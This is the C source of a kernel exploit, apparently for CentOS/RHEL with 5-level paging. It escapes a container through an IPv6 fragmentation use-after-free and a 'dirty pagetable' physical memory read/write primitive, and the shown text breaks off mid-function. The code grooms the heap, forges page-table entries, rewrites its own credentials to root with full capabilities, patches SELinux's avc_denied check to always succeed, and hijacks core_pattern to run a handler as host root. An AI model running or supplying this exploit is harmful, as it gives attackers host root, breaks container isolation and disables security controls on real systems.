/* IPV6_FRAG_ESCAPE.c: offset-free CentOS/RHEL 6.12 (LA57) container escape via an IPv6 fragment dirty pagetable. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <poll.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>

#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef SPLICE_F_MORE
#define SPLICE_F_MORE 4
#endif
#ifndef IPV6_MTU
#define IPV6_MTU 24
#endif
#ifndef MADV_NOHUGEPAGE
#define MADV_NOHUGEPAGE 15
#endif

/* trigger parameters (unchanged from the original reproducer) */
#define EXP_NRFRAGS 1
#define EXP_NHOLD   8
#define EXP_PL1     576
#define EXP_NGROOM  64
#define EXP_EXTHDR  640
#define EXP_K       256
#define EXP_L2      8
#define PORT        12345
/* Per-run Unix socket inside the container's /tmp; the core_pattern helper (host root, init ns)
   reaches it through /proc/<crash-pid>/root, the same chrooted fs the caller sees. The path carries
   the caller pid so a stale root-owned socket from an earlier run cannot block our bind (sticky
   /tmp), and the handler learns the exact path from its argv rather than a fixed name. No network. */
#define CORE_SOCK_FMT "/tmp/.core_sock_%d"

/* trampoline / phys-window scan bounds */
#define LOW_SCAN_LO 0x80000UL
#define LOW_SCAN_HI 0x9f000UL
#define TGT_LO      0x1000000UL
#define SLOT_BASE   40
#define SLOT_CAP    505

/* ===== IPv6-fragment trigger ===== */
static unsigned char trig_buf[1 << 16];
static int g_frag_mtu = 1280;
static char g_core_sock[64];   /* the per-run socket path, set in main and baked into core_pattern */
static int g_force_proc = 0;   /* --force-proc-kallsyms: skip the in-process parser, use /proc/kallsyms */

static void loopback_up(void)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        return;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strcpy(ifr.ifr_name, "lo");
    ifr.ifr_flags = IFF_UP | IFF_RUNNING;
    ioctl(fd, SIOCSIFFLAGS, &ifr);
    close(fd);
}

static void set_frag_mtu(int sock)
{
    int mtu = g_frag_mtu;
    setsockopt(sock, IPPROTO_IPV6, IPV6_MTU, &mtu, sizeof mtu);
}

static int set_srh(int sock, int exthdr)
{
    if (exthdr < 24 || (exthdr & 7)) {
        return -1;
    }
    int rest = exthdr - 8;
    int nseg = rest / 16;
    int tlv = rest - nseg * 16;
    if (tlv && tlv < 2) {
        nseg--;
        tlv += 16;
    }
    if (nseg < 1) {
        return -1;
    }
    static unsigned char opt[8 + 16 * 128];
    if (exthdr > (int)sizeof opt) {
        return -1;
    }
    memset(opt, 0, exthdr);
    opt[1] = (exthdr - 8) / 8;
    opt[2] = 4;
    opt[3] = 0;
    opt[4] = (unsigned char)(nseg - 1);
    struct in6_addr addr;
    inet_pton(AF_INET6, "::1", &addr);
    for (int i = 0; i < nseg; i++) {
        memcpy(opt + 8 + 16 * i, &addr, 16);
    }
    if (tlv) {
        int off = 8 + 16 * nseg;
        opt[off] = 0;
        opt[off + 1] = (unsigned char)(tlv - 2);
    }
    return setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, opt, exthdr);
}

static int make_sock(int exthdr, int port)
{
    int sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (sock < 0) {
        return -1;
    }
    if (exthdr >= 24) {
        if (set_srh(sock, exthdr) < 0) {
            close(sock);
            return -1;
        }
    }
    set_frag_mtu(sock);
    struct sockaddr_in6 sa;
    memset(&sa, 0, sizeof sa);
    sa.sin6_family = AF_INET6;
    sa.sin6_port = htons(port);
    inet_pton(AF_INET6, "::1", &sa.sin6_addr);
    if (connect(sock, (struct sockaddr *)&sa, sizeof sa) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

/* dirty-pagetable physical R/W primitive:
 * "leaf_pt" is the freed pipe-buffer page that the kernel reallocated as the last-level (leaf) page
 * table backing our VR scratch VMA. Because we still alias that physical page, we can write its
 * page-table entries and thus map any physical frame into VR. Each 8-byte write to the pipe (g_wp1)
 * appends one PTE into leaf_pt; VR[slot] then maps the forged frame. win_seq() is the bootstrap
 * sequential window (one fill, capped at SLOT_CAP). Once leaf_pt maps ITSELF at VR[g_selfslot]
 * (reachable as g_leaf_pte), win_selfref() rewrites leaf_pt's 512 entries by plain stores, giving
 * unlimited random-access windows. 
 */

static int g_wp0 = -1;
static int g_wp1 = -1;
static unsigned char *g_vr = 0;
static unsigned long g_fl = 0;
static unsigned long g_nx = 0;
static unsigned long g_ent[32];
static int g_slot = SLOT_BASE;
static unsigned char *g_scratch = 0;
static size_t g_scratch_len = 0;
static long g_forges = 0;
static volatile unsigned long *g_leaf_pte = 0;   /* leaf_pt's 512 PTEs, writable once it self-maps */
static int g_wk = 0;
static int g_wk_lo = 64;
static int g_wk_hi = 291;
static long g_passes = 0;
static int g_selfslot = 0;

/* Full-mm TLB flush from ring 3: we cannot INVLPG, so mprotect() over a range larger than
 * tlb_single_page_flush_ceiling makes the kernel escalate to flush_tlb_mm (a FULL flush of
 * this mm's TLB, including our VR window VAs) without walking leaf PT. g_scratch is 64 pages. 
 */
static void tlb_flush_full(void)
{
    if (!g_scratch) {
        return;
    }
    mprotect(g_scratch, g_scratch_len, PROT_READ);
    mprotect(g_scratch, g_scratch_len, PROT_READ | PROT_WRITE);
}

static volatile unsigned char *win_seq(unsigned long pa)
{
    if (g_slot >= SLOT_CAP) {
        return 0;
    }
    unsigned long page = pa & ~0xfffUL;
    unsigned long pte = g_nx | ((page >> 12) << 12) | g_fl;
    if (write(g_wp1, &pte, 8) != 8) {
        return 0;
    }
    volatile unsigned char *vp = (volatile unsigned char *)(g_vr + (unsigned long)g_slot * 4096);
    g_slot++;
    g_forges++;
    return vp + (pa & 0xfffUL);
}

static volatile unsigned char *win_selfref(unsigned long pa)
{
    if (g_wk < g_wk_lo || g_wk >= g_wk_hi) {
        g_wk = g_wk_lo;
        tlb_flush_full();
        g_passes++;
    }
    int slot = g_wk++;
    g_leaf_pte[slot] = (pa & ~0xfffUL) | g_fl;       /* inject a present+rw leaf PTE for pa into leaf PT[slot] */
    __asm__ __volatile__("mfence" ::: "memory");     /* drain the PTE store before the walker reads it */
    tlb_flush_full();                                /* invalidate the stale VR[slot] translation */
    return (volatile unsigned char *)(g_vr + (unsigned long)slot * 4096) + (pa & 0xfffUL);
}

static volatile unsigned char *win_map(unsigned long pa)
{
    return g_leaf_pte ? win_selfref(pa) : win_seq(pa);
}

static int phys_read(unsigned long pa, void *dst, unsigned long len)
{
    unsigned char *d = dst;
    while (len) {
        unsigned long off = pa & 0xfffUL;
        unsigned long n = 4096 - off;
        if (n > len) {
            n = len;
        }
        volatile unsigned char *p = win_map(pa);
        if (!p) {
            return -1;
        }
        for (unsigned long i = 0; i < n; i++) {
            d[i] = p[i];
        }
        d += n;
        pa += n;
        len -= n;
    }
    return 0;
}

static int phys_write(unsigned long pa, const void *src, unsigned long len)
{
    const unsigned char *s = src;
    while (len) {
        unsigned long off = pa & 0xfffUL;
        unsigned long n = 4096 - off;
        if (n > len) {
            n = len;
        }
        volatile unsigned char *p = win_map(pa);
        if (!p) {
            return -1;
        }
        for (unsigned long i = 0; i < n; i++) {
            p[i] = s[i];
        }
        s += n;
        pa += n;
        len -= n;
    }
    return 0;
}

static unsigned long rd8(unsigned long pa)
{
    unsigned long v = 0;
    phys_read(pa, &v, 8);
    return v;
}

/* zero-seed page-table walk to leaf_pt_phys (separate TU; fed our phys_read via pm_set_read). */
#include "pagemap.h"

/* in-process kallsyms parser (kallsysms.c, separate TU; fed our phys_read via ks_set_read). It
   reverses the dumped kernel image with no privilege and no LSM-mediated syscall, so it is tier 1
   of the symbol resolve and the only path that works from a confined domain such as httpd_t. */
extern void ks_set_read(int (*rd)(unsigned long pa, void *buf, unsigned long len));
extern int ks_resolve(unsigned long kbase, unsigned long ktext_va);
extern unsigned long ks_sym(const char *name);

/* Fail-safe paging-mode gate. The whole walk assumes 5-level paging (LA57) is ACTIVE; the
 * `la57` /proc/cpuinfo flag only proves CPU support. Under 5-level the kernel honors mmap()
 * hints above the 47-bit DEFAULT_MAP_WINDOW; under 4-level it clamps below it. 
 */
static int has_5level(void)
{
    void *hint = (void *)(1UL << 47);
    void *p = mmap(hint, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (p == MAP_FAILED) {
        return 0;
    }
    int five = ((unsigned long)p >= (1UL << 47));
    munmap(p, 4096);
    return five;
}

/* A use-after-free is live (a dangling pipe reference to a freed page, and/or a forged page table)
 * but we cannot recover it. STOP the process instead of exiting: exiting would let the pipe close
 * and put_page the freed page a second time (it may already be reused), or tear down the forged
 * page table, either of which crashes the box. Staying alive keeps every dangling reference pinned,
 * so the box is safe until it is rebooted. 
 */
static void freeze_safe(const char *why)
{
    printf("[!] %s; STOPPING the process (not exiting) to keep the dangling UAF reference pinned. "
           "A clean exit would put_page a possibly-reused page and crash the box; reboot to clear.\n", why);
    fflush(stdout);
    for (;;) {
        pause();
    }
}

/* heap groom: prime the slab so the freed pipe page is reclaimed as VR's leaf page table. */
static void groom_heap(int wp_rd, int exthdr, int pl1, int ngroom, int klen)
{
    int groom_sock = make_sock(exthdr, PORT);
    int gpipe[2];
    if (groom_sock < 0 || pipe(gpipe) != 0) {
        if (groom_sock >= 0) {
            close(groom_sock);
        }
        return;
    }
    fcntl(gpipe[1], F_SETPIPE_SZ, 1 << 20);
    for (int i = 0; i < ngroom; i++) {
        int one = 1;
        setsockopt(groom_sock, IPPROTO_UDP, UDP_CORK, &one, sizeof one);
        (void)!write(gpipe[1], trig_buf, pl1);
        (void)!tee(wp_rd, gpipe[1], klen, 0);
        struct iovec iov = { trig_buf, 600 };
        (void)!vmsplice(gpipe[1], &iov, 1, 0);
        splice(gpipe[0], NULL, groom_sock, NULL, pl1 + klen + 600, SPLICE_F_MORE);
        send(groom_sock, (void *)0, 64, 0);
    }
    close(gpipe[0]);
    close(gpipe[1]);
    close(groom_sock);
}

/* fire the fragmented IPv6 datagram, reclaim the freed pipe page as VR's leaf page table (leaf_pt),
 * and wire the phys primitive.
 * On success g_vr / g_ent / g_fl / g_nx and the forge pipe are live. Returns 0, or -1. 
 */
static int trigger_and_reclaim(void)
{
    cpu_set_t cpus;
    CPU_ZERO(&cpus);
    CPU_SET(0, &cpus);
    sched_setaffinity(0, sizeof cpus, &cpus);

    int exthdr = EXP_EXTHDR;
    int len1 = 1232 - exthdr;
    int len2 = EXP_L2;
    int klen = EXP_K;
    int nfrags = EXP_NRFRAGS;

    int wp[2];
    if (pipe(wp) < 0) {
        return -1;
    }
    fcntl(wp[1], F_SETPIPE_SZ, 1 << 20);
    unsigned char mark[256];
    memset(mark, 0x41, sizeof mark);
    if (write(wp[1], mark, klen) != klen) {
        return -1;
    }

    int hold_pipe[64][2];
    int nheld = 0;
    for (int i = 0; i < EXP_NHOLD; i++) {
        if (pipe(hold_pipe[i]) < 0) {
            break;
        }
        fcntl(hold_pipe[i][1], F_SETPIPE_SZ, 1 << 20);
        if (tee(wp[0], hold_pipe[i][1], klen, 0) != klen) {
            close(hold_pipe[i][0]);
            close(hold_pipe[i][1]);
            break;
        }
        nheld++;
    }

    int sock = make_sock(exthdr, PORT);
    if (sock < 0) {
        fprintf(stderr, "[!] trigger socket setup failed\n");
        return -1;
    }
    int trig_pipe[2];
    if (pipe(trig_pipe) < 0) {
        return -1;
    }
    fcntl(trig_pipe[1], F_SETPIPE_SZ, 1 << 20);

    groom_heap(wp[0], exthdr, EXP_PL1, EXP_NGROOM, klen);

    unsigned long gib = 1UL << 30;
    unsigned long pmd_2m = 2UL * 1024 * 1024;
    int nr_gb = 2;
    unsigned char *vraw = mmap(NULL, (nr_gb + 1) * gib, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    unsigned char *vbase = (vraw == MAP_FAILED) ? vraw
                           : (unsigned char *)(((unsigned long)vraw + gib - 1) & ~(gib - 1));
    if (vraw != MAP_FAILED) {
        madvise(vraw, (nr_gb + 1) * gib, MADV_NOHUGEPAGE);
    }
    if (vbase != MAP_FAILED) {
        for (int i = 0; i < nr_gb; i++) {
            *(volatile char *)(vbase + (unsigned long)i * gib) = 1;
        }
    }

    memset(trig_buf + len1 - 8, 0, 8);
    trig_buf[len1 - 8 + 2] = (unsigned char)nfrags;
    int one = 1;
    setsockopt(sock, IPPROTO_UDP, UDP_CORK, &one, sizeof one);
    (void)!write(trig_pipe[1], trig_buf, len1);
    splice(trig_pipe[0], NULL, sock, NULL, len1, SPLICE_F_MORE);
    (void)!write(trig_pipe[1], trig_buf, len2);
    splice(trig_pipe[0], NULL, sock, NULL, len2, SPLICE_F_MORE);
    close(sock);
    memset(trig_buf + len1 - 8, 0, 8);

    for (int i = 0; i < nheld; i++) {
        close(hold_pipe[i][0]);
        close(hold_pipe[i][1]);
    }

    unsigned char *vr = (vbase == MAP_FAILED) ? vbase : vbase + pmd_2m;
    if (vr && vr != MAP_FAILED) {
        for (int i = 0; i < 32; i++) {
            *(volatile char *)(vr + (unsigned long)i * 4096) = 0x55;
        }
    }

    unsigned char readback[256];
    ssize_t got = read(wp[0], readback, 248);
    int reused = 0;
    for (int i = 0; i < (int)got; i++) {
        if (readback[i] != 0x41) {
            reused = 1;
            break;
        }
    }
    if (!reused) {
        /* The bug's put_page already fired, but the freed pipe page did not come back as our page
           table: a PCP-freelist reclaim miss, not a slab miss (a slab miss faults immediately). The
           pipe still holds a dangling reference to that freed page, so we must NOT exit. */
        freeze_safe("pipe page re-use failed (PCP-level reclaim miss)");
    }
    printf("[*] PIPE-UAF: leaf PT freed + reclaimed as a leaf PTE table\n");
    fflush(stdout);

    unsigned long *ent = (unsigned long *)readback;
    int first = -1;
    for (int i = 0; i < 31; i++) {
        if (ent[i] & 1) {
            first = i;
            break;
        }
    }
    if (first < 0) {
        /* the page came back as leaf PT but carries no usable PTE; it is a live forged page table now,
           so exiting would tear it down. Stop and keep it pinned. */
        freeze_safe("reclaimed page exposes no usable PTE");
    }
    unsigned long flags = ent[first] & 0xfff;
    unsigned long nxbit = ent[first] & (1UL << 63);
    printf("[*] reclaimed leaf PT: first present entry pte[%d]=0x%lx (flags=0x%lx, nx=%d)\n",
           first, ent[first], flags, nxbit ? 1 : 0);
    fflush(stdout);
    for (int i = 0; i < 8; i++) {
        unsigned long e = ent[i];
        if (write(wp[1], &e, 8) != 8) {
            break;
        }
    }

    fcntl(wp[0], F_SETFL, O_NONBLOCK);
    g_wp0 = wp[0];
    g_wp1 = wp[1];
    g_vr = vr;
    g_fl = flags;
    g_nx = nxbit;
    for (int i = 0; i < 31; i++) {
        g_ent[i] = ent[i];
    }
    g_slot = SLOT_BASE;
    g_scratch_len = 64 * 4096;
    g_scratch = mmap(NULL, g_scratch_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_scratch != MAP_FAILED) {
        for (size_t i = 0; i < g_scratch_len; i += 4096) {
            g_scratch[i] = 1;
        }
    } else {
        g_scratch = 0;
    }
    return 0;
}

/* trampoline anchor -> zero-seed walk to leaf_pt_phys -> install the self-referential PTE window.
   Returns leaf_pt_phys, or 0 on failure (caller must freeze: the dirty PT is already forged). */
static unsigned long bootstrap_selfref(void)
{
    pm_set_read(phys_read);
    unsigned long d0_pfn = (g_ent[0] & 0x000ffffffffff000UL) >> 12;
    unsigned long level4_phys = 0;
    unsigned long leaf_pt_phys = 0;
    int attempts = 0;
    int last_stage = 0;
    printf("[*] D0 anchor pfn=0x%lx (from reclaimed VR data page ent[0])\n", d0_pfn);
    printf("[*] searching SMP trampoline PML5 in phys [0x%lx, 0x%lx)...\n",
           (unsigned long)LOW_SCAN_LO, (unsigned long)LOW_SCAN_HI);
    fflush(stdout);

    /* the only raw-physical scan in the exploit: hunt the SMP trampoline PML5 in the low real-mode
     * area and validate each candidate STRUCTURALLY through pm_bootstrap (the init_top_pgt adjacency
     * is ~2^-64 unique, then D0's struct page is cross-checked). The first candidate that validates
     * is the real level4_kernel_pgt, so no RAM map is needed. The attempt cap stops a run of false
     * positives from exhausting the single-fill forge window (each rejection costs ~48 forges). 
     */

    for (unsigned long lp = LOW_SCAN_LO; lp < LOW_SCAN_HI && !leaf_pt_phys; lp += 0x1000) {
        volatile unsigned char *vp = win_seq(lp);
        if (!vp) {
            break;
        }
        unsigned long pml5e = ((unsigned long *)vp)[511];
        unsigned long target = pml5e & 0x000ffffffffff000UL;
        if (!(pml5e & 1) || (pml5e & 0x60) != 0x60 || target < TGT_LO) {
            continue;
        }
        if (++attempts > 6) {
            printf("[!] trampoline scan: too many candidates, giving up\n");
            break;
        }
        printf("[*]   candidate @phys 0x%lx: PML5[511]=0x%lx -> level4 0x%lx (validating)\n",
               lp, pml5e, target);
        fflush(stdout);
        int stage = 0;
        unsigned long cand = pm_bootstrap(target, d0_pfn, (unsigned long)g_vr, &stage);
        if (cand) {
            level4_phys = target;
            leaf_pt_phys = cand;
            printf("[*]   validated: this is the SMP trampoline -> level4_kernel_pgt\n");
        } else {
            last_stage = stage;
            printf("[*]   rejected at pm_bootstrap stage %d\n", stage);
            if (stage == 5) {
                break;          /* BTF load failed; retrying other candidates will not help */
            }
        }
        fflush(stdout);
    }
    if (!leaf_pt_phys) {
        printf("[!] no validated trampoline level4 anchor (attempts=%d last_stage=%d forges=%ld)\n",
               attempts, last_stage, g_forges);
        return 0;
    }
    printf("[*] level4_kernel_pgt(phys)=0x%lx validated (attempts=%d forges=%ld)\n",
           level4_phys, attempts, g_forges);
    printf("[*] leaf_pt_phys=0x%lx (zero-seed: itp=0x%lx vmemmap=0x%lx forges=%ld)\n",
           leaf_pt_phys, pm_itp(), pm_vmemmap_base(), g_forges);
    fflush(stdout);

    int selfslot = g_slot;
    unsigned long self_pte = (leaf_pt_phys & ~0xfffUL) | g_fl;
    if (write(g_wp1, &self_pte, 8) != 8) {
        printf("[!] self-map forge failed\n");
        return 0;
    }
    g_slot++;
    g_leaf_pte = (volatile unsigned long *)(g_vr + (unsigned long)selfslot * 4096);
    int mapped_ok = 1;
    for (int i = 0; i < 8; i++) {
        if (g_leaf_pte[i] != g_ent[i]) {
            mapped_ok = 0;
        }
    }
    printf("[*] self-map %s: VR[%d] aliases leaf_pt (leaf_pte[0]=0x%lx ent[0]=0x%lx)\n",
           mapped_ok ? "OK" : "MISMATCH", selfslot, (unsigned long)g_leaf_pte[0], g_ent[0]);
    fflush(stdout);
    if (!mapped_ok) {
        return 0;
    }
    g_selfslot = selfslot;
    g_wk_lo = selfslot + 8;        /* the win_selfref pool lives ABOVE the self-map slot */
    g_wk_hi = 505;
    g_wk = 0;
    if (g_wk_lo >= g_wk_hi) {
        printf("[!] no window-pool room (slot=%d)\n", selfslot);
        return 0;
    }
    printf("[*] win_selfref pool = slots %d..%d\n", g_wk_lo, g_wk_hi - 1);
    fflush(stdout);
    return leaf_pt_phys;
}

static unsigned long find_own_task(void)
{
    unsigned long mm_pa = pm_kva2pa(pm_mm());
    unsigned long task_kva = rd8(mm_pa + (unsigned long)pm_off("mm_struct", "owner"));
    unsigned long task_pa = pm_kva2pa(task_kva);
    printf("[*] task_struct kva=0x%lx phys=0x%lx\n", task_kva, task_pa);
    fflush(stdout);
    return task_pa;
}

/* init_user_ns: climb our cred->user_ns->parent chain to the root (parent == NULL). Short,
   stable chain (we pin the bottom), offset-free, with none of the task-list freed-pointer risk. */
static unsigned long find_init_userns(unsigned long task_pa)
{
    long off_user_ns = pm_off("cred", "user_ns");
    long off_parent = pm_off("user_namespace", "parent");
    long off_cred = pm_off("task_struct", "cred");
    if (off_user_ns < 0 || off_parent < 0 || off_cred < 0) {
        printf("[!] BTF: cred/user_ns/parent missing\n");
        return 0;
    }
    unsigned long cred = rd8(task_pa + (unsigned long)off_cred);
    unsigned long userns = rd8(pm_kva2pa(cred) + (unsigned long)off_user_ns);
    for (int i = 0; userns && i < 64; i++) {
        unsigned long parent = rd8(pm_kva2pa(userns) + (unsigned long)off_parent);
        if (!parent) {
            return userns;
        }
        userns = parent;
    }
    return 0;
}

/* cred in place: ids/caps -> root; user_ns -> init_user_ns (refcount-bumped iff changed). Also
   grants CAP_SYSLOG-in-init_userns, which the /proc/kallsyms read needs. */
static void escalate_cred(unsigned long task_pa, unsigned long init_userns)
{
    long off_cred = pm_off("task_struct", "cred");
    long off_real_cred = pm_off("task_struct", "real_cred");
    long off_uid = pm_off("cred", "uid");
    long off_cap = pm_off("cred", "cap_inheritable");
    long off_user_ns = pm_off("cred", "user_ns");
    long off_ns_count = pm_off("user_namespace", "ns") + pm_off("ns_common", "count");
    unsigned long cred[2];
    cred[0] = rd8(task_pa + (unsigned long)off_cred);
    cred[1] = rd8(task_pa + (unsigned long)off_real_cred);
    int ncred = (cred[1] && cred[1] != cred[0]) ? 2 : 1;
    for (int c = 0; c < ncred; c++) {
        unsigned long cred_pa = pm_kva2pa(cred[c]);
        unsigned int zero = 0;
        for (int i = 0; i < 8; i++) {
            phys_write(cred_pa + (unsigned long)off_uid + (unsigned long)i * 4, &zero, 4);
        }
        unsigned long full = ~0UL;
        for (int i = 0; i < 5; i++) {
            phys_write(cred_pa + (unsigned long)off_cap + (unsigned long)i * 8, &full, 8);
        }
        unsigned long cur_userns = rd8(cred_pa + (unsigned long)off_user_ns);
        if (cur_userns != init_userns) {
            unsigned long count_pa = pm_kva2pa(init_userns) + (unsigned long)off_ns_count;
            unsigned int rc = 0;
            phys_read(count_pa, &rc, 4);
            rc++;
            phys_write(count_pa, &rc, 4);
            phys_write(cred_pa + (unsigned long)off_user_ns, &init_userns, 8);
        }
    }
    /* read the cred back through the primitive and print the ACTUAL post-write state. */
    unsigned long check_pa = pm_kva2pa(cred[0]);
    unsigned int got_uid = 0;
    phys_read(check_pa + (unsigned long)off_uid, &got_uid, 4);
    unsigned long got_cap = rd8(check_pa + (unsigned long)pm_off("cred", "cap_effective"));
    unsigned long got_userns = rd8(check_pa + (unsigned long)off_user_ns);
    printf("[*] cred@0x%lx: uid=%u cap_effective=0x%lx user_ns=0x%lx\n",
           check_pa, got_uid, got_cap, got_userns);
    fflush(stdout);
}

/* with CAP_SYSLOG held, the kernel reveals real addresses in /proc/kallsyms; read off the
   handful of globals we need. Zeroed or hidden values mean the caps bump did not take. Returns 0 or -1. */
static int resolve_syms(unsigned long *avc, unsigned long *core_pattern)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        printf("[!] /proc/kallsyms open failed\n");
        return -1;
    }
    *avc = 0;
    *core_pattern = 0;
    char line[256];
    char name[128];
    unsigned long addr;
    char type;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, name) != 3) {
            continue;
        }
        if (!*avc && !strcmp(name, "avc_denied")) {
            *avc = addr;
        } else if (!*core_pattern && !strcmp(name, "core_pattern")) {
            *core_pattern = addr;
        }
        if (*avc && *core_pattern) {
            break;
        }
    }
    fclose(f);
    if ((*core_pattern >> 48) != 0xffff) {
        printf("[!] /proc/kallsyms hidden (core_pattern=0x%lx); CAP_SYSLOG bump failed\n",
               *core_pattern);
        return -1;
    }
    printf("[*] kallsyms(kernel-parsed): core_pattern=0x%lx avc_denied=0x%lx\n",
           *core_pattern, *avc);
    fflush(stdout);
    return 0;
}

/* neuter SELinux MAC: avc_denied -> `xor eax,eax ; ret` (skipping endbr64 if present). Best
   effort: an unconfined domain is not MAC-gated and may lack avc_denied, in which case we skip it. */
static void stub_mac(unsigned long avc_kva)
{
    if ((avc_kva >> 48) != 0xffff) {
        printf("[*] avc_denied not in kallsyms; skipping MAC stub (unconfined domain)\n");
        fflush(stdout);
        return;
    }
    unsigned long avc_pa = pm_kva2pa(avc_kva);
    if (!avc_pa) {
        return;
    }
    unsigned char prologue[4];
    phys_read(avc_pa, prologue, 4);
    int endbr = (prologue[0] == 0xf3 && prologue[1] == 0x0f && prologue[2] == 0x1e && prologue[3] == 0xfa) ? 4 : 0;
    unsigned char stub[3] = { 0x31, 0xc0, 0xc3 };
    phys_write(avc_pa + (unsigned)endbr, stub, 3);
    /* read the patched bytes back and report the ACTUAL prologue, not a claim. */
    unsigned char check[3] = { 0, 0, 0 };
    phys_read(avc_pa + (unsigned)endbr, check, 3);
    int installed = (check[0] == 0x31 && check[1] == 0xc0 && check[2] == 0xc3);
    printf("[*] avc_denied @0x%lx +%d: %02x %02x %02x -> %s\n", avc_pa, endbr,
           check[0], check[1], check[2], installed ? "stub installed (MAC off)" : "stub FAILED");
    fflush(stdout);
}

/* write the kernel core_pattern buffer (resolved from /proc/kallsyms) to a pipe handler the kernel
   runs as root in the INIT namespaces on the next core dump. The handler path is routed through
   /proc/%P/root so it resolves inside the crashing task's (container) filesystem, and the crash PID
   is passed as %P so the handler can reach our socket at /proc/%P/root<g_core_sock>, whose path we
   also pass as the last argument. No live-task namespace surgery: the handler is a fresh
   kernel-spawned process already in the init namespaces. */
static int patch_core_pattern(unsigned long cp_kva)
{
    char self[160];
    ssize_t r = readlink("/proc/self/exe", self, sizeof self - 1);
    if (r <= 0) {
        printf("[!] readlink /proc/self/exe failed\n");
        return -1;
    }
    self[r] = 0;
    char pattern[256];
    int n = snprintf(pattern, sizeof pattern, "|/proc/%%P/root%s --core %%P %s", self, g_core_sock);
    if (n < 0 || n >= 128) {            /* CORENAME_MAX_SIZE is 128 */
        printf("[!] core_pattern too long (%d)\n", n);
        return -1;
    }
    unsigned long cp_pa = pm_kva2pa(cp_kva);
    if (!cp_pa) {
        printf("[!] core_pattern translate failed\n");
        return -1;
    }
    phys_write(cp_pa, pattern, (unsigned long)n + 1);
    char check[256] = {0};
    phys_read(cp_pa, check, (unsigned long)n + 1);
    printf("[*] core_pattern set: %s\n", check);
    fflush(stdout);
    return strcmp(check, pattern) == 0 ? 0 : -1;
}

/* ask the kernel itself (real syscalls) whether the cred rewrite took; getres*id reports all
   three of the ids we zeroed, so the kernel is the authority on success, not our own bookkeeping.
   Returns 1 if the kernel confirms uid/gid 0 across the board, else 0. */
static int verify_escape(void)
{
    uid_t ruid = -1;
    uid_t euid = -1;
    uid_t suid = -1;
    gid_t rgid = -1;
    gid_t egid = -1;
    gid_t sgid = -1;
    getresuid(&ruid, &euid, &suid);
    getresgid(&rgid, &egid, &sgid);
    printf("[*] kernel getresuid -> r=%d e=%d s=%d ; getresgid -> r=%d e=%d s=%d\n",
           ruid, euid, suid, rgid, egid, sgid);
    int root = (ruid == 0 && euid == 0 && suid == 0 && rgid == 0 && egid == 0 && sgid == 0);
    if (root) {
        printf("[+] ROOT: kernel confirms uid/gid 0 across the board; escape OK\n");
    } else {
        printf("[-] escape did not take (uid still %d)\n", ruid);
    }
    fflush(stdout);
    return root;
}

/* physical base of the loaded kernel image and the _text VA, from the kernel-text page tables:
   init_top_pgt[511] -> [511] -> [510] = level2_kernel_pgt; the first present 2MB entry maps _text.
   ktext_va equals kallsyms relative_base, which the in-process parser needs. Returns 0 on failure. */
static unsigned long derive_kbase(unsigned long *ktext_va)
{
    unsigned long mask = 0x000ffffffffff000UL;
    unsigned long itp = pm_itp();
    if (!itp) {
        return 0;
    }
    unsigned long l4 = rd8(itp + 511 * 8) & mask;
    unsigned long l3 = rd8(l4 + 511 * 8) & mask;
    unsigned long l2 = rd8(l3 + 510 * 8) & mask;
    for (int i = 0; i < 512; i++) {
        unsigned long entry = rd8(l2 + (unsigned long)i * 8);
        if (!(entry & 1)) {
            continue;
        }
        *ktext_va = 0xffffffff80000000UL + (unsigned long)i * 0x200000UL;
        if (entry & 0x80) {
            return entry & 0x000fffffffe00000UL;
        }
        unsigned long pte = rd8(entry & mask);
        return (pte & 1) ? (pte & mask) : 0;
    }
    return 0;
}

/* tier 1: resolve avc_denied + core_pattern with the unprivileged in-process parser (no cred
   rewrite, no /proc/kallsyms), so it also works from a confined domain. Returns 0 with both set. */
static int resolve_syms_inproc(unsigned long *avc, unsigned long *core_pattern)
{
    unsigned long ktext_va = 0;
    unsigned long kbase = derive_kbase(&ktext_va);
    if (!kbase) {
        printf("[*] in-process kallsyms: kbase derive failed\n");
        fflush(stdout);
        return -1;
    }
    ks_set_read(phys_read);
    if (ks_resolve(kbase, ktext_va) != 0) {
        printf("[*] in-process kallsyms: parse/validate failed (kbase=0x%lx _text=0x%lx)\n",
               kbase, ktext_va);
        fflush(stdout);
        return -1;
    }
    *avc = ks_sym("avc_denied");
    *core_pattern = ks_sym("core_pattern");
    printf("[*] kallsyms(in-process): core_pattern=0x%lx avc_denied=0x%lx (kbase=0x%lx)\n",
           *core_pattern, *avc, kbase);
    fflush(stdout);
    return 0;
}

/* tier 2: grant CAP_SYSLOG in init_userns then let the kernel print /proc/kallsyms, and read off
   the symbols we patch. The cred rewrite (uid 0 + full caps + cred->user_ns = init_user_ns) is what
   makes the kallsyms_show_value check (against init_user_ns) reveal real addresses. Used only when
   the in-process parser cannot validate; needs the cred rewrite, so it is not for confined domains.
   Returns 0 with both symbols set, -1 otherwise. */
static int resolve_syms_proc(unsigned long *avc, unsigned long *core_pattern)
{
    unsigned long task_pa = find_own_task();
    if (!task_pa) {
        printf("[!] task not found\n");
        return -1;
    }
    unsigned long init_userns = find_init_userns(task_pa);
    if ((init_userns >> 48) != 0xffff) {
        printf("[!] init_user_ns parent-walk failed (0x%lx)\n", init_userns);
        return -1;
    }
    printf("[*] init_user_ns=0x%lx (cred->user_ns->parent walk)\n", init_userns);
    fflush(stdout);
